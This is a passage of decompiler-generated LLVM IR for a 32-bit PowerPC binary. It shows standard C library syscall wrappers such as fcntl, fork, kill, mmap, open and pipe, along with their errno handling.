  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a294, { 1, 0 }
  uselistorder label %dec_label_pc_1000a284, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000a2b0 = add i32 %arg2, -12
  %v2_1000a2b4 = icmp ugt i32 %v1_1000a2b0, 2
  %v2_1000a2bc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000a2bc, i32* %stack_var_-32, align 4
  br i1 %v2_1000a2b4, label %dec_label_pc_1000a2e8, label %dec_label_pc_1000a2d8

dec_label_pc_1000a2d8:                            ; preds = %entry
  store i32 268477152, i32* @lr, align 4
  %v2_1000a2dc = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000a2dc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a308

dec_label_pc_1000a2e8:                            ; preds = %entry
  %v0_1000a2ec = call i32 @__asm_mfcr()
  %v1_1000a2f0 = and i32 %v0_1000a2ec, 268435456
  %v3_1000a2f0 = icmp eq i32 %v1_1000a2f0, 0
  store i32 %v0_1000a2ec, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a2f0, label %dec_label_pc_1000a308, label %dec_label_pc_1000a2fc

dec_label_pc_1000a2fc:                            ; preds = %dec_label_pc_1000a2e8
  %v0_1000a2fc = call i32 @__errno_location()
  %v0_1000a300 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a300 = inttoptr i32 %v0_1000a2fc to i32*
  store i32 %v0_1000a300, i32* %v2_1000a300, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a308

dec_label_pc_1000a308:                            ; preds = %dec_label_pc_1000a2e8, %dec_label_pc_1000a2d8, %dec_label_pc_1000a2fc
  %v0_1000a30c = phi i32 [ %v0_1000a2ec, %dec_label_pc_1000a2e8 ], [ %v2_1000a2dc, %dec_label_pc_1000a2d8 ], [ -1, %dec_label_pc_1000a2fc ]
  ret i32 %v0_1000a30c

; uselistorder directives
  uselistorder label %dec_label_pc_1000a308, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000a338 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000a338, i32* %stack_var_-32, align 4
  %v0_1000a354 = call i32 @__asm_mfcr()
  %v1_1000a358 = and i32 %v0_1000a354, 268435456
  %v3_1000a358 = icmp eq i32 %v1_1000a358, 0
  store i32 %v0_1000a354, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a358, label %dec_label_pc_1000a370, label %dec_label_pc_1000a364

dec_label_pc_1000a364:                            ; preds = %entry
  %v0_1000a364 = call i32 @__errno_location()
  %v0_1000a368 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a368 = inttoptr i32 %v0_1000a364 to i32*
  store i32 %v0_1000a368, i32* %v2_1000a368, align 4
  br label %dec_label_pc_1000a370

dec_label_pc_1000a370:                            ; preds = %entry, %dec_label_pc_1000a364
  %v0_1000a380 = phi i32 [ %v0_1000a354, %entry ], [ -1, %dec_label_pc_1000a364 ]
  ret i32 %v0_1000a380

; uselistorder directives
  uselistorder label %dec_label_pc_1000a370, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000a398

dec_label_pc_1000a398:                            ; preds = %dec_label_pc_1000a398.backedge, %entry
  %v0_1000a3a4 = call i32 @__asm_mfcr()
  %v1_1000a3a8 = and i32 %v0_1000a3a4, 268435456
  %v3_1000a3a8 = icmp eq i32 %v1_1000a3a8, 0
  store i32 %v0_1000a3a4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a3a8, label %dec_label_pc_1000a398.backedge, label %dec_label_pc_1000a3b4

dec_label_pc_1000a3b4:                            ; preds = %dec_label_pc_1000a398
  %v0_1000a3b4 = call i32 @__errno_location()
  %v0_1000a3b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a3b8 = inttoptr i32 %v0_1000a3b4 to i32*
  store i32 %v0_1000a3b8, i32* %v2_1000a3b8, align 4
  br label %dec_label_pc_1000a398.backedge

dec_label_pc_1000a398.backedge:                   ; preds = %dec_label_pc_1000a3b4, %dec_label_pc_1000a398
  br label %dec_label_pc_1000a398
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a3d8 = call i32 @__asm_mfcr()
  %v1_1000a3dc = and i32 %v0_1000a3d8, 268435456
  %v3_1000a3dc = icmp eq i32 %v1_1000a3dc, 0
  store i32 %v0_1000a3d8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a3dc, label %dec_label_pc_1000a3f4, label %dec_label_pc_1000a3e8

dec_label_pc_1000a3e8:                            ; preds = %entry
  %v0_1000a3e8 = call i32 @__errno_location()
  %v0_1000a3ec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a3ec = inttoptr i32 %v0_1000a3e8 to i32*
  store i32 %v0_1000a3ec, i32* %v2_1000a3ec, align 4
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a3f4:                            ; preds = %entry, %dec_label_pc_1000a3e8
  %v0_1000a404 = phi i32 [ %v0_1000a3d8, %entry ], [ -1, %dec_label_pc_1000a3e8 ]
  ret i32 %v0_1000a404

; uselistorder directives
  uselistorder label %dec_label_pc_1000a3f4, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a420 = call i32 @__asm_mfcr()
  %v1_1000a424 = and i32 %v0_1000a420, 268435456
  %v3_1000a424 = icmp eq i32 %v1_1000a424, 0
  store i32 %v0_1000a420, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a424, label %dec_label_pc_1000a43c, label %dec_label_pc_1000a430

dec_label_pc_1000a430:                            ; preds = %entry
  %v0_1000a430 = call i32 @__errno_location()
  %v0_1000a434 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a434 = inttoptr i32 %v0_1000a430 to i32*
  store i32 %v0_1000a434, i32* %v2_1000a434, align 4
  br label %dec_label_pc_1000a43c

dec_label_pc_1000a43c:                            ; preds = %entry, %dec_label_pc_1000a430
  %v0_1000a44c = phi i32 [ %v0_1000a420, %entry ], [ -1, %dec_label_pc_1000a430 ]
  ret i32 %v0_1000a44c

; uselistorder directives
  uselistorder label %dec_label_pc_1000a43c, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a468 = call i32 @__asm_mfcr()
  %v1_1000a46c = and i32 %v0_1000a468, 268435456
  %v3_1000a46c = icmp eq i32 %v1_1000a46c, 0
  store i32 %v0_1000a468, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a46c, label %dec_label_pc_1000a484, label %dec_label_pc_1000a478

dec_label_pc_1000a478:                            ; preds = %entry
  %v0_1000a478 = call i32 @__errno_location()
  %v0_1000a47c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a47c = inttoptr i32 %v0_1000a478 to i32*
  store i32 %v0_1000a47c, i32* %v2_1000a47c, align 4
  br label %dec_label_pc_1000a484

dec_label_pc_1000a484:                            ; preds = %entry, %dec_label_pc_1000a478
  %v0_1000a494 = phi i32 [ %v0_1000a468, %entry ], [ -1, %dec_label_pc_1000a478 ]
  ret i32 %v0_1000a494

; uselistorder directives
  uselistorder label %dec_label_pc_1000a484, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a4b0 = call i32 @__asm_mfcr()
  %v1_1000a4b4 = and i32 %v0_1000a4b0, 268435456
  %v3_1000a4b4 = icmp eq i32 %v1_1000a4b4, 0
  store i32 %v0_1000a4b0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a4b4, label %dec_label_pc_1000a4cc, label %dec_label_pc_1000a4c0

dec_label_pc_1000a4c0:                            ; preds = %entry
  %v0_1000a4c0 = call i32 @__errno_location()
  %v0_1000a4c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a4c4 = inttoptr i32 %v0_1000a4c0 to i32*
  store i32 %v0_1000a4c4, i32* %v2_1000a4c4, align 4
  br label %dec_label_pc_1000a4cc

dec_label_pc_1000a4cc:                            ; preds = %entry, %dec_label_pc_1000a4c0
  %v0_1000a4dc = phi i32 [ %v0_1000a4b0, %entry ], [ -1, %dec_label_pc_1000a4c0 ]
  ret i32 %v0_1000a4dc

; uselistorder directives
  uselistorder label %dec_label_pc_1000a4cc, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_1000a4e8 = load i32, i32* @global_var_1002f074.241, align 4
  %v3_1000a4ec = icmp eq i32 %v3_1000a4e8, 0
  %v0_1000a4f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a4ec, i32 %v0_1000a4f0)
  ret i32 %v3_1000a4e8
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a514 = call i32 @__asm_mfcr()
  %v1_1000a518 = and i32 %v0_1000a514, 268435456
  %v3_1000a518 = icmp eq i32 %v1_1000a518, 0
  store i32 %v0_1000a514, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a518, label %dec_label_pc_1000a530, label %dec_label_pc_1000a524

dec_label_pc_1000a524:                            ; preds = %entry
  %v0_1000a524 = call i32 @__errno_location()
  %v0_1000a528 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a528 = inttoptr i32 %v0_1000a524 to i32*
  store i32 %v0_1000a528, i32* %v2_1000a528, align 4
  br label %dec_label_pc_1000a530

dec_label_pc_1000a530:                            ; preds = %entry, %dec_label_pc_1000a524
  %v0_1000a540 = phi i32 [ %v0_1000a514, %entry ], [ -1, %dec_label_pc_1000a524 ]
  ret i32 %v0_1000a540

; uselistorder directives
  uselistorder label %dec_label_pc_1000a530, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a55c = call i32 @__asm_mfcr()
  %v1_1000a560 = and i32 %v0_1000a55c, 268435456
  %v3_1000a560 = icmp eq i32 %v1_1000a560, 0
  store i32 %v0_1000a55c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a560, label %dec_label_pc_1000a578, label %dec_label_pc_1000a56c

dec_label_pc_1000a56c:                            ; preds = %entry
  %v0_1000a56c = call i32 @__errno_location()
  %v0_1000a570 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a570 = inttoptr i32 %v0_1000a56c to i32*
  store i32 %v0_1000a570, i32* %v2_1000a570, align 4
  br label %dec_label_pc_1000a578

dec_label_pc_1000a578:                            ; preds = %entry, %dec_label_pc_1000a56c
  %v0_1000a588 = phi i32 [ %v0_1000a55c, %entry ], [ -1, %dec_label_pc_1000a56c ]
  ret i32 %v0_1000a588

; uselistorder directives
  uselistorder label %dec_label_pc_1000a578, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a5a4 = call i32 @__asm_mfcr()
  %v1_1000a5a8 = and i32 %v0_1000a5a4, 268435456
  %v3_1000a5a8 = icmp eq i32 %v1_1000a5a8, 0
  store i32 %v0_1000a5a4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a5a8, label %dec_label_pc_1000a5c0, label %dec_label_pc_1000a5b4

dec_label_pc_1000a5b4:                            ; preds = %entry
  %v0_1000a5b4 = call i32 @__errno_location()
  %v0_1000a5b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a5b8 = inttoptr i32 %v0_1000a5b4 to i32*
  store i32 %v0_1000a5b8, i32* %v2_1000a5b8, align 4
  br label %dec_label_pc_1000a5c0

dec_label_pc_1000a5c0:                            ; preds = %entry, %dec_label_pc_1000a5b4
  %v0_1000a5d0 = phi i32 [ %v0_1000a5a4, %entry ], [ -1, %dec_label_pc_1000a5b4 ]
  ret i32 %v0_1000a5d0

; uselistorder directives
  uselistorder label %dec_label_pc_1000a5c0, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a5ec = call i32 @__asm_mfcr()
  %v1_1000a5f0 = and i32 %v0_1000a5ec, 268435456
  %v3_1000a5f0 = icmp eq i32 %v1_1000a5f0, 0
  store i32 %v0_1000a5ec, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a5f0, label %dec_label_pc_1000a608, label %dec_label_pc_1000a5fc

dec_label_pc_1000a5fc:                            ; preds = %entry
  %v0_1000a5fc = call i32 @__errno_location()
  %v0_1000a600 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a600 = inttoptr i32 %v0_1000a5fc to i32*
  store i32 %v0_1000a600, i32* %v2_1000a600, align 4
  br label %dec_label_pc_1000a608

dec_label_pc_1000a608:                            ; preds = %entry, %dec_label_pc_1000a5fc
  %v0_1000a618 = phi i32 [ %v0_1000a5ec, %entry ], [ -1, %dec_label_pc_1000a5fc ]
  ret i32 %v0_1000a618

; uselistorder directives
  uselistorder label %dec_label_pc_1000a608, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a634 = call i32 @__asm_mfcr()
  %v1_1000a638 = and i32 %v0_1000a634, 268435456
  store i32 %v1_1000a638, i32* @r9, align 4
  %v3_1000a638 = icmp eq i32 %v1_1000a638, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000a634, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a638, label %dec_label_pc_1000a650, label %dec_label_pc_1000a644

dec_label_pc_1000a644:                            ; preds = %entry
  %v0_1000a644 = call i32 @__errno_location()
  %v0_1000a648 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a648 = inttoptr i32 %v0_1000a644 to i32*
  store i32 %v0_1000a648, i32* %v2_1000a648, align 4
  br label %dec_label_pc_1000a650

dec_label_pc_1000a650:                            ; preds = %entry, %dec_label_pc_1000a644
  %v0_1000a660 = phi i32 [ %v0_1000a634, %entry ], [ -1, %dec_label_pc_1000a644 ]
  ret i32 %v0_1000a660

; uselistorder directives
  uselistorder label %dec_label_pc_1000a650, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000a664 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r10, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000a690 = call i32 @__asm_mfcr()
  %v1_1000a694 = and i32 %v0_1000a690, 268435456
  %v3_1000a694 = icmp eq i32 %v1_1000a694, 0
  store i32 %v0_1000a690, i32* %r31.global-to-local, align 4
  store i32 %v0_1000a690, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a694, label %dec_label_pc_1000a6b8, label %dec_label_pc_1000a6a8

dec_label_pc_1000a6a8:                            ; preds = %entry
  %v0_1000a6a8 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000a6b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a6b0 = inttoptr i32 %v0_1000a6a8 to i32*
  store i32 %v0_1000a6b0, i32* %v2_1000a6b0, align 4
  %v0_1000a6bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a6bc

dec_label_pc_1000a6b8:                            ; preds = %entry
  %v3_1000a6a0 = icmp eq i32 %v0_1000a690, 0
  br i1 %v3_1000a6a0, label %dec_label_pc_1000a6c8, label %dec_label_pc_1000a6bc

dec_label_pc_1000a6bc:                            ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a6a8
  %v0_1000a6bc = phi i32 [ %v0_1000a690, %dec_label_pc_1000a6b8 ], [ %v0_1000a6bc.pre, %dec_label_pc_1000a6a8 ]
  store i32 %v0_1000a6bc, i32* @r4, align 4
  %tmp = icmp slt i32 %v0_1000a6bc, 0
  %v1_1000a6c0 = zext i1 %tmp to i32
  %v2_1000a6c0 = ashr i32 %v0_1000a6bc, 31
  %v3_1000a6c0 = and i32 %v2_1000a6c0, -2
  %v4_1000a6c0 = or i32 %v3_1000a6c0, %v1_1000a6c0
  br label %dec_label_pc_1000a6d0

dec_label_pc_1000a6c8:                            ; preds = %dec_label_pc_1000a6b8
  %v3_1000a6c8 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a6d0

dec_label_pc_1000a6d0:                            ; preds = %dec_label_pc_1000a6bc, %dec_label_pc_1000a6c8
  %v0_1000a6e0 = phi i32 [ %v4_1000a6c0, %dec_label_pc_1000a6bc ], [ %v3_1000a6c8, %dec_label_pc_1000a6c8 ]
  store i32 %v0_1000a664, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a6e0

; uselistorder directives
  uselistorder i32 %v0_1000a6bc, { 2, 0, 1 }
  uselistorder i32 %v0_1000a690, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000a6d0, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  %v1_1000a6fc = add i32 %arg1, 448
  %v2_1000a6fc = inttoptr i32 %v1_1000a6fc to i32*
  %v3_1000a6fc = load i32, i32* %v2_1000a6fc, align 4
  %v3_1000a700 = icmp eq i32 %v3_1000a6fc, 0
  br i1 %v3_1000a700, label %dec_label_pc_1000a718, label %dec_label_pc_1000a708

dec_label_pc_1000a708:                            ; preds = %entry
  %v1_1000a70c = add i32 %arg1, 452
  store i32 268478232, i32* @lr, align 4
  %v3_1000a714 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_1000a70c, i32 0)
  %v0_1000a718.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a718

dec_label_pc_1000a718:                            ; preds = %entry, %dec_label_pc_1000a708
  %v0_1000a718 = phi i32 [ %arg2, %entry ], [ %v0_1000a718.pre, %dec_label_pc_1000a708 ]
  %v3_1000a718 = icmp eq i32 %v0_1000a718, 0
  br i1 %v3_1000a718, label %dec_label_pc_1000a720, label %dec_label_pc_1000a724

dec_label_pc_1000a720:                            ; preds = %dec_label_pc_1000a718
  br label %dec_label_pc_1000a724

dec_label_pc_1000a724:                            ; preds = %dec_label_pc_1000a718, %dec_label_pc_1000a720
  %v0_1000a728 = phi i32 [ %v0_1000a718, %dec_label_pc_1000a718 ], [ 1, %dec_label_pc_1000a720 ]
  %v0_1000a724 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a72c = inttoptr i32 %v0_1000a724 to i32*
  %v3_1000a72c = call i32 @__longjmp(i32* %v2_1000a72c, i32 %v0_1000a728)
  ret i32 %v3_1000a72c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a724, { 1, 0 }
  uselistorder label %dec_label_pc_1000a718, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a748 = call i32 @__asm_mfcr()
  %v1_1000a74c = and i32 %v0_1000a748, 268435456
  %v3_1000a74c = icmp eq i32 %v1_1000a74c, 0
  store i32 %v0_1000a748, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a74c, label %dec_label_pc_1000a764, label %dec_label_pc_1000a758

dec_label_pc_1000a758:                            ; preds = %entry
  %v0_1000a758 = call i32 @__errno_location()
  %v0_1000a75c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a75c = inttoptr i32 %v0_1000a758 to i32*
  store i32 %v0_1000a75c, i32* %v2_1000a75c, align 4
  br label %dec_label_pc_1000a764

dec_label_pc_1000a764:                            ; preds = %entry, %dec_label_pc_1000a758
  %v0_1000a774 = phi i32 [ %v0_1000a748, %entry ], [ -1, %dec_label_pc_1000a758 ]
  ret i32 %v0_1000a774

; uselistorder directives
  uselistorder label %dec_label_pc_1000a764, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a790 = call i32 @__asm_mfcr()
  %v1_1000a794 = and i32 %v0_1000a790, 268435456
  %v3_1000a794 = icmp eq i32 %v1_1000a794, 0
  store i32 %v0_1000a790, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a794, label %dec_label_pc_1000a7ac, label %dec_label_pc_1000a7a0

dec_label_pc_1000a7a0:                            ; preds = %entry
  %v0_1000a7a0 = call i32 @__errno_location()
  %v0_1000a7a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a7a4 = inttoptr i32 %v0_1000a7a0 to i32*
  store i32 %v0_1000a7a4, i32* %v2_1000a7a4, align 4
  br label %dec_label_pc_1000a7ac

dec_label_pc_1000a7ac:                            ; preds = %entry, %dec_label_pc_1000a7a0
  %v0_1000a7bc = phi i32 [ %v0_1000a790, %entry ], [ -1, %dec_label_pc_1000a7a0 ]
  ret i32 %v0_1000a7bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000a7ac, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a7d8 = call i32 @__asm_mfcr()
  %v1_1000a7dc = and i32 %v0_1000a7d8, 268435456
  %v3_1000a7dc = icmp eq i32 %v1_1000a7dc, 0
  store i32 %v0_1000a7d8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a7dc, label %dec_label_pc_1000a7f4, label %dec_label_pc_1000a7e8

dec_label_pc_1000a7e8:                            ; preds = %entry
  %v0_1000a7e8 = call i32 @__errno_location()
  %v0_1000a7ec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a7ec = inttoptr i32 %v0_1000a7e8 to i32*
  store i32 %v0_1000a7ec, i32* %v2_1000a7ec, align 4
  br label %dec_label_pc_1000a7f4

dec_label_pc_1000a7f4:                            ; preds = %entry, %dec_label_pc_1000a7e8
  %v0_1000a804 = phi i32 [ %v0_1000a7d8, %entry ], [ -1, %dec_label_pc_1000a7e8 ]
  ret i32 %v0_1000a804

; uselistorder directives
  uselistorder label %dec_label_pc_1000a7f4, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a820 = call i32 @__asm_mfcr()
  %v1_1000a824 = and i32 %v0_1000a820, 268435456
  %v3_1000a824 = icmp eq i32 %v1_1000a824, 0
  store i32 %v0_1000a820, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a824, label %dec_label_pc_1000a83c, label %dec_label_pc_1000a830

dec_label_pc_1000a830:                            ; preds = %entry
  %v0_1000a830 = call i32 @__errno_location()
  %v0_1000a834 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a834 = inttoptr i32 %v0_1000a830 to i32*
  store i32 %v0_1000a834, i32* %v2_1000a834, align 4
  br label %dec_label_pc_1000a83c

dec_label_pc_1000a83c:                            ; preds = %entry, %dec_label_pc_1000a830
  %v0_1000a84c = phi i32 [ %v0_1000a820, %entry ], [ -1, %dec_label_pc_1000a830 ]
  ret i32 %v0_1000a84c

; uselistorder directives
  uselistorder label %dec_label_pc_1000a83c, { 1, 0 }
}

define i32 @__libc_nanosleep() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a868 = call i32 @__asm_mfcr()
  %v1_1000a86c = and i32 %v0_1000a868, 268435456
  %v3_1000a86c = icmp eq i32 %v1_1000a86c, 0
  store i32 %v0_1000a868, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a86c, label %dec_label_pc_1000a884, label %dec_label_pc_1000a878

dec_label_pc_1000a878:                            ; preds = %entry
  %v0_1000a878 = call i32 @__errno_location()
  %v0_1000a87c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a87c = inttoptr i32 %v0_1000a878 to i32*
  store i32 %v0_1000a87c, i32* %v2_1000a87c, align 4
  br label %dec_label_pc_1000a884

dec_label_pc_1000a884:                            ; preds = %entry, %dec_label_pc_1000a878
  %v0_1000a894 = phi i32 [ %v0_1000a868, %entry ], [ -1, %dec_label_pc_1000a878 ]
  ret i32 %v0_1000a894

; uselistorder directives
  uselistorder label %dec_label_pc_1000a884, { 1, 0 }
}

define i32 @__libc_open() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_1000a8ac = load i32, i32* @r4, align 4
  %v1_1000a8ac = and i32 %v0_1000a8ac, 64
  %v3_1000a8ac = icmp eq i32 %v1_1000a8ac, 0
  br i1 %v3_1000a8ac, label %dec_label_pc_1000a8d8, label %dec_label_pc_1000a8bc

dec_label_pc_1000a8bc:                            ; preds = %entry
  %v2_1000a8c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000a8c4, i32* %stack_var_-32, align 4
  %v0_1000a8d4 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000a8d8

dec_label_pc_1000a8d8:                            ; preds = %entry, %dec_label_pc_1000a8bc
  %v0_1000a8d8 = phi i32 [ 0, %entry ], [ %v0_1000a8d4, %dec_label_pc_1000a8bc ]
  store i32 %v0_1000a8d8, i32* @r5, align 4
  %v0_1000a8e0 = call i32 @__asm_mfcr()
  %v1_1000a8e4 = and i32 %v0_1000a8e0, 268435456
  %v3_1000a8e4 = icmp eq i32 %v1_1000a8e4, 0
  store i32 %v0_1000a8e0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a8e4, label %dec_label_pc_1000a8fc, label %dec_label_pc_1000a8f0

dec_label_pc_1000a8f0:                            ; preds = %dec_label_pc_1000a8d8
  %v0_1000a8f0 = call i32 @__errno_location()
  %v0_1000a8f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a8f4 = inttoptr i32 %v0_1000a8f0 to i32*
  store i32 %v0_1000a8f4, i32* %v2_1000a8f4, align 4
  br label %dec_label_pc_1000a8fc

dec_label_pc_1000a8fc:                            ; preds = %dec_label_pc_1000a8d8, %dec_label_pc_1000a8f0
  %v0_1000a90c = phi i32 [ %v0_1000a8e0, %dec_label_pc_1000a8d8 ], [ -1, %dec_label_pc_1000a8f0 ]
  ret i32 %v0_1000a90c

; uselistorder directives
  uselistorder label %dec_label_pc_1000a8fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8d8, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 577, i32* @r4, align 4
  %v0_1000a91c = call i32 @__libc_open()
  ret i32 %v0_1000a91c
}

define i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v1_1000a930 = and i32 %arg1, 64
  %v3_1000a930 = icmp eq i32 %v1_1000a930, 0
  %v1_1000a934 = or i32 %arg1, 65536
  store i32 %v1_1000a934, i32* @r4, align 4
  br i1 %v3_1000a930, label %dec_label_pc_1000a95c, label %dec_label_pc_1000a940

dec_label_pc_1000a940:                            ; preds = %entry
  %v2_1000a948 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_1000a948, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1000a95c

dec_label_pc_1000a95c:                            ; preds = %entry, %dec_label_pc_1000a940
  %v0_1000a95c = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_1000a940 ]
  store i32 %v0_1000a95c, i32* @r5, align 4
  store i32 268478824, i32* @lr, align 4
  %v0_1000a964 = call i32 @__libc_open()
  ret i32 %v0_1000a964

; uselistorder directives
  uselistorder label %dec_label_pc_1000a95c, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a990 = call i32 @__asm_mfcr()
  %v1_1000a994 = and i32 %v0_1000a990, 268435456
  %v3_1000a994 = icmp eq i32 %v1_1000a994, 0
  store i32 %v0_1000a990, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a994, label %dec_label_pc_1000a9ac, label %dec_label_pc_1000a9a0

dec_label_pc_1000a9a0:                            ; preds = %entry
  %v0_1000a9a0 = call i32 @__errno_location()
  %v0_1000a9a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a9a4 = inttoptr i32 %v0_1000a9a0 to i32*
  store i32 %v0_1000a9a4, i32* %v2_1000a9a4, align 4
  br label %dec_label_pc_1000a9ac

dec_label_pc_1000a9ac:                            ; preds = %entry, %dec_label_pc_1000a9a0
  %v0_1000a9bc = phi i32 [ %v0_1000a990, %entry ], [ -1, %dec_label_pc_1000a9a0 ]
  ret i32 %v0_1000a9bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000a9ac, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
